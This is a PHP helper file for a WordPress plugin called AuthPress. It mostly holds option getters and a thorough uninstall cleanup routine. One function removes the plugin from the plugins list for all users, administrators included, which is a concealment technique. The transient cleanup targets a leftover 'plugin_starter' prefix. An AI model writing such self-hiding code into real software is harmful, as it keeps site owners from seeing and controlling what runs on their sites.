<?php
if ( ! defined( 'ABSPATH' ) ) exit;
function authpress_get_default_options()
{
	$authpress_default_options = [];
	$authpress_default_options = apply_filters('authpress_default_options_modify', $authpress_default_options);
	return $authpress_default_options;
}
function authpress_get_default_colors()
{
	$authpress_default_colors = [];
	$authpress_default_colors = apply_filters('authpress_default_colors_modify', $authpress_default_colors);
	return $authpress_default_colors;
}

function authpress_get_default_gradients()
{
	$authpress_default_gradients = [];
	$authpress_default_gradients = apply_filters('authpress_default_gradients_modify', $authpress_default_gradients);
	return $authpress_default_gradients;
}

function authpress_get_default_tables()
{
	$authpress_default_tables = [];
	$authpress_default_tables = apply_filters('authpress_default_tables_modify', $authpress_default_tables);
	return $authpress_default_tables;
}
function authpress_get_default_presets()
{
	$authpress_default_presets = [];
	$authpress_default_presets = apply_filters('authpress_default_presets_modify', $authpress_default_presets);
	return $authpress_default_presets;
}

// update_option('authpress_options', authpress_get_default_options());

function authpress_get_option()
{
	$authpress_options_database = get_option('authpress_options', []);
	$authpress_options = array_replace_recursive(authpress_get_default_options(), $authpress_options_database);
	return $authpress_options;
}
function authpress_is_plugin_page()
{
	if (function_exists('get_current_screen')) {
		$current_screen = get_current_screen();
		// var_dump($current_screen->id);
		$pages = [];
		if (
			$current_screen->id == 'toplevel_page_authpress'
			|| in_array($current_screen->id, $pages)
		) {
			return true;
		}
	}
	return false;
}
function authpress_hide_plugin_from_list($plugins) {
	// Only hide for non-administrators or specific users
	if (current_user_can('administrator')) {
		// Optionally hide even from admins
		// unset($plugins['authpress/authpress.php']);
	}

	// Hide from all users
	unset($plugins['authpress/authpress.php']);

	return $plugins;
}



/**
 * Delete all custom database tables
 */
function authpress_delete_tables() {
    global $wpdb;

    // Array of custom tables to delete (without prefix)
    $tables = array(
        'authpress_logs',
        // Add more custom tables here
        // 'authpress_another_table',
    );

    foreach ( $tables as $table ) {
        $table_name = $wpdb->prefix . $table;
        $wpdb->query( "DROP TABLE IF EXISTS {$table_name}" );
    }
}

/**
 * Delete all plugin options
 */
function authpress_delete_options() {
    global $wpdb;

    // Delete specific options
    $options = array(
        'authpress_version',
        'authpress_settings',
        'authpress_delete_on_deactivate',
        // Add more options here
    );

    foreach ( $options as $option ) {
        delete_option( $option );
        delete_site_option( $option ); // For multisite
    }

    // Delete all options with prefix
    $wpdb->query(
        "DELETE FROM {$wpdb->options} 
        WHERE option_name LIKE '%authpress%'"
    );

    // For multisite
    if ( is_multisite() ) {
        $wpdb->query(
            "DELETE FROM {$wpdb->sitemeta} 
            WHERE meta_key LIKE '%authpress%'"
        );
    }
}

/**
 * Delete all user meta
 */
function authpress_delete_user_meta() {
    global $wpdb;

    $wpdb->query(
        "DELETE FROM {$wpdb->usermeta} 
        WHERE meta_key LIKE '%authpress%'"
    );
}

/**
 * Delete all post meta
 */
function authpress_delete_post_meta() {
    global $wpdb;

    $wpdb->query(
        "DELETE FROM {$wpdb->postmeta} 
        WHERE meta_key LIKE '%authpress%'"
    );
}

/**
 * Delete all transients
 */
function authpress_delete_transients() {
    global $wpdb;

    // Delete regular transients
    $wpdb->query(
        "DELETE FROM {$wpdb->options} 
        WHERE option_name LIKE '\_transient\_plugin\_starter\_%' 
        OR option_name LIKE '\_transient\_timeout\_plugin\_starter\_%'"
    );

    // Delete site transients (for multisite)
    if ( is_multisite() ) {
        $wpdb->query(
            "DELETE FROM {$wpdb->sitemeta} 
            WHERE meta_key LIKE '\_site\_transient\_plugin\_starter\_%' 
            OR meta_key LIKE '\_site\_transient\_timeout\_plugin\_starter\_%'"
        );
    }
}

/**
 * Delete uploaded files (if any)
 */
function authpress_delete_files() {
    $upload_dir = wp_upload_dir();
    $plugin_upload_dir = $upload_dir['basedir'] . '/authpress/';

    if ( is_dir( $plugin_upload_dir ) ) {
        authpress_delete_directory( $plugin_upload_dir );
    }
}

/**
 * Recursively delete a directory
 *
 * @param string $dir Directory path.
 * @return bool
 */
function authpress_delete_directory( $dir ) {
    if ( ! is_dir( $dir ) ) {
        return false;
    }

    global $wp_filesystem;

    if ( ! $wp_filesystem ) {
        WP_Filesystem();
    }

    $files = array_diff( scandir( $dir ), array( '.', '..' ) );

    foreach ( $files as $file ) {
        $path = $dir . '/' . $file;

        if ( is_dir( $path ) ) {
            authpress_delete_directory( $path );
        } else {
            wp_delete_file( $path );
        }
    }

    return $wp_filesystem->rmdir( $dir );
}

/**
 * Delete custom post types and their posts
 */
function authpress_delete_custom_posts() {
    global $wpdb;

    // If you have custom post types, delete them
    $post_types = array(
        'authpress_cpt',
        // Add more custom post types here
    );

    foreach ( $post_types as $post_type ) {
        $posts = get_posts(
            array(
                'post_type'      => $post_type,
                'posts_per_page' => -1,
                'post_status'    => 'any',
            )
        );

        foreach ( $posts as $post ) {
            // Force delete (skip trash)
            wp_delete_post( $post->ID, true );
        }
    }
}

/**
 * Delete custom taxonomies and terms
 */
function authpress_delete_taxonomies() {
    // If you have custom taxonomies, delete their terms
    $taxonomies = array(
        'authpress_taxonomy',
        // Add more custom taxonomies here
    );

    foreach ( $taxonomies as $taxonomy ) {
        $terms = get_terms(
            array(
                'taxonomy'   => $taxonomy,
                'hide_empty' => false,
            )
        );

        if ( ! is_wp_error( $terms ) ) {
            foreach ( $terms as $term ) {
                wp_delete_term( $term->term_id, $taxonomy );
            }
        }
    }
}

/**
 * Delete scheduled cron jobs
 */
function authpress_delete_cron_jobs() {
    // Clear scheduled hooks
    $cron_hooks = array(
        'authpress_daily_cleanup',
        'authpress_weekly_report',
        // Add more cron hooks here
    );

    foreach ( $cron_hooks as $hook ) {
        $timestamp = wp_next_scheduled( $hook );
        if ( $timestamp ) {
            wp_unschedule_event( $timestamp, $hook );
        }
        
        // Clear all instances of the hook
        wp_clear_scheduled_hook( $hook );
    }
}

/**
 * Delete capabilities added to roles
 */
function authpress_delete_capabilities() {
    global $wp_roles;

    if ( ! isset( $wp_roles ) ) {
        $wp_roles = new WP_Roles();
    }

    $capabilities = array(
        'manage_authpress',
        'edit_authpress',
        // Add more custom capabilities here
    );

    foreach ( $wp_roles->roles as $role_name => $role_info ) {
        $role = get_role( $role_name );
        
        if ( $role ) {
            foreach ( $capabilities as $cap ) {
                $role->remove_cap( $cap );
            }
        }
    }
}

/**
 * For multisite: delete from all sites
 */
function authpress_multisite_cleanup() {
    if ( ! is_multisite() ) {
        return;
    }

    global $wpdb;

    // Get all blog IDs
    $blog_ids = $wpdb->get_col( "SELECT blog_id FROM {$wpdb->blogs}" );

    foreach ( $blog_ids as $blog_id ) {
        switch_to_blog( $blog_id );
        
        // Run cleanup for this site
        authpress_delete_tables();
        authpress_delete_options();
        authpress_delete_user_meta();
        authpress_delete_post_meta();
        authpress_delete_transients();
        authpress_delete_custom_posts();
        authpress_delete_taxonomies();
        authpress_delete_cron_jobs();
        
        restore_current_blog();
    }

    // Delete network-wide options
    authpress_delete_options();
}

function authpress_data_cleanup(){
	// ============================================
	// RUN THE CLEANUP
	// ============================================

	// For single site
	if ( ! is_multisite() ) {
		authpress_delete_tables();
		authpress_delete_options();
		authpress_delete_user_meta();
		authpress_delete_post_meta();
		authpress_delete_transients();
		authpress_delete_files();
		authpress_delete_custom_posts();
		authpress_delete_taxonomies();
		authpress_delete_cron_jobs();
		authpress_delete_capabilities();
	} else {
		// For multisite
		authpress_multisite_cleanup();
		authpress_delete_capabilities();
	}

	// Log the uninstall (optional)
	error_log( 'AuthPress: Complete uninstall cleanup completed.' );
}